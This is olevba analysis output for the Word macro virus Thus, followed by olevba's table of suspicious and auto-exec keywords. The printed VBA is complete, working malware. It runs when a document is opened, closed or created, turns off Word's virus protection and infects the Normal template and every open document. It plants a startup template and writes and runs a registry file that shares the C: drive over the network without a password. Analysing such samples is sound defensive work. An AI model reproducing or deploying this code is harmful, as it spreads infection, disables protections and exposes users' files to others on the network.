olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.dg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.dg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
'Surgeon'
On Error Resume Next
With Application.Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
'This is small fun'
Dim nt As Object, ad As Object
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If nt.Lines(12, 1) <> "'This is small fun'" Then nt.DeleteLines 1, nt.CountOfLines
If nt.CountOfLines = 0 Then nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
    With Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule
     If .Lines(12, 1) <> "'This is small fun'" Then .DeleteLines 1, .CountOfLines
     If .CountOfLines = 0 Then .InsertLines 1, nt.Lines(1, nt.CountOfLines)
    End With
Next k
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\Program Files\Microsoft Office\Office\STARTUP"
    .SearchSubFolders = False
    If .Execute > 0 Then GoTo r1
End With
Documents.Add Template:="", NewTemplate:=True
    ActiveDocument.SaveAs FileName:= _
        "C:\Program Files\Microsoft Office\Office\STARTUP\autosave.dot", _
        FileFormat:=wdFormatTemplate, LockComments:=False, Password:="", _
        AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, _
        EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData _
        :=False, SaveAsAOCELetter:=False
   With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        .AddFromString ("sub viewvbcode()" & ":" & "end sub")
        .AddFromString ("sub ToolsMacro()" & ":" & "end sub")
        .AddFromString ("sub FileTemplates()" & ":" & "end sub")
        
    ActiveDocument.Save
    ActiveDocument.Close
  End With
r1:
Dim c As String
If Asc((System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C", _
     "Flags")) = 146) Then GoTo exits1
Open "c:\nc.dll" For Output As #1
c = "REGEDIT4"
Print #1, c
c = "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C]"
Print #1, c
c = Chr(34) & "Flags" & Chr(34) & "=dword:00000192"
Print #1, c
c = Chr(34) & "Type" & Chr(34) & "=dword:00000000"
Print #1, c
c = Chr(34) & "Path" & Chr(34) & "=" & Chr(34) & "C:\\" & Chr(34)
Print #1, c
c = Chr(34) & "Parm2enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Parm1enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Remark" & Chr(34) & "=" & Chr(34) & Chr(34)
Print #1, c
Close #1
Shell "regedit c:\nc.dll"
Kill "c:\nc.dll"
exits1:
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub





























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |nc.dll              |Executable file name                         |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

